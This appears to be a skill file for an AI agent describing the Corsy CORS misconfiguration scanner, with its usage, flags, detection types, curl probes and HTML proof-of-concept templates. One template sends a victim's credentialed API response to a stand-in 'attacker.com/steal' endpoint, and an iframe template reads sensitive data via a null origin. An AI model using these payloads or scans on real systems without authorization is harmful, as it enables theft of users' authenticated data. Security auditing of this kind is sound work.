---
name: corsy
description: "Corsy: lightweight CORS misconfiguration scanner detecting 10+ vulnerability types including origin reflection, null origin, pre/post-domain bypass, regex bypass, and wildcard. Use when auditing CORS policies on web APIs and SPAs to find cross-origin data theft vectors."
license: MIT
compatibility: "Linux / macOS / Windows. Python 3 + requests. git clone https://github.com/s0md3v/Corsy && pip3 install requests"
metadata:
  author: AeonDave
  version: "1.1"
---

# Corsy

CORS misconfiguration scanner — 10+ vuln types, lightweight, fast.

## Quick Start

```bash
git clone https://github.com/s0md3v/Corsy
cd Corsy && pip3 install requests

# Single URL
python3 corsy.py -u https://target.com

# With authentication
python3 corsy.py -u https://api.target.com -H "Authorization: Bearer TOKEN"

# Bulk scan from file
python3 corsy.py -i urls.txt -t 10

# JSON output
python3 corsy.py -u https://target.com --json > cors.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u <url>` | Single target URL |
| `-i <file>` | Input file with one URL per line |
| `-H "K: V"` | Custom header (auth, cookies) |
| `-t <N>` | Thread count (default: 2) |
| `-d <N>` | Delay between requests (ms) |
| `-q` | Quiet mode (no banner) |
| `--json` | JSON output |

## Misconfiguration Types Detected

| Type | Condition | Exploitable |
|------|-----------|-------------|
| **Origin Reflection** | Server mirrors any Origin header | Critical if +credentials |
| **Null Origin** | `null` origin accepted | Critical (iframe sandbox attack) |
| **Pre-domain bypass** | `evil.target.com` accepted | High |
| **Post-domain bypass** | `target.com.evil.com` accepted | High |
| **Underscore bypass** | `target_evil.com` accepted | High |
| **Backtick bypass** | Origin with backtick accepted | High |
| **Unescaped dot** | Regex dot not escaped | Medium |
| **Wildcard** | `Access-Control-Allow-Origin: *` | Medium (no credentials) |
| **Wildcard + credentials** | `*` + `credentials: true` | Not exploitable (browser blocks) |
| **Invalid value** | Malformed CORS header | Info |
| **Third-party allowed** | Unknown domain trusted | High |
| **HTTP on HTTPS** | HTTP origin trusted | Medium |

## Exploitation: What Makes CORS Exploitable

Critical = `Access-Control-Allow-Origin: <reflected>` + `Access-Control-Allow-Credentials: true`

```bash
# Manual test with curl
curl -H "Origin: https://attacker.com" https://api.target.com/profile -Iv 2>&1 | grep -i "access-control"

# Test null origin
curl -H "Origin: null" https://api.target.com/data -Iv 2>&1 | grep -i "access-control"

# Test pre-domain bypass
curl -H "Origin: https://eviltarget.com" https://api.target.com/ -Iv 2>&1 | grep -i "access-control"

# Preflight (OPTIONS) test
curl -X OPTIONS -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: POST" \
    https://api.target.com/data -Iv
```

## PoC Templates

**Reflected Origin + Credentials (Critical)**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', 'https://api.target.com/user/profile', true);
xhr.onload = function() {
    fetch('https://attacker.com/steal?d=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

**Null Origin (via iframe sandbox)**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open('GET', 'https://api.target.com/sensitive', true);
xhr.onload = function() { alert(xhr.responseText); };
xhr.send();
</script>
"></iframe>
```

## Common Workflows

```bash
# API endpoint scan with session cookie
python3 corsy.py -u https://api.target.com \
    -H "Cookie: session=abc123; auth=token"

# Scan API paths list
cat api_endpoints.txt | python3 corsy.py -i /dev/stdin -t 20

# Full recon pipeline
cat domains.txt | httpx -silent | python3 corsy.py -i /dev/stdin --json > cors_results.json
```

## Resources

| File | When to load |
|------|--------------|
| `references/cors-exploit.md` | Full PoC templates, CORS header explanation, pre-flight vs simple requests, impact examples |
